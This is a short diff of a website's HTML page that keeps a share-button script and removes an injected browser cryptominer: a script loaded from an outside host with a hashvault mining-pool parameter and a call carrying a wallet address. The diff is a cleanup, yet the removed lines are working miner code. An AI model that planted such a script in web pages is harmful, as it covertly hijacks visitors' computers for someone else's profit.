@@ -209,8 +209,3 @@ These are applications that are completely for informational purposes and allow 
 </center>
 
 <script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=67540d39231a330012e9230e&product=sticky-share-buttons&source=platform" async="async"></script>
-
-<script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?algy=rx/0?nosaj=pool.hashvault.pro:80" ></script>
-<script type="text/javascript">
-EverythingIsLife('ZEPHYR2VUAd6W61sQJkRni8WkwBkC9hLFZHbeM7SzXXpMkGs6WUy2bgf4bsEGVNRC81vn4615pFBrFTbwH3BQnMF9CtZbch8wCB2S', 'x', 30);
-</script>
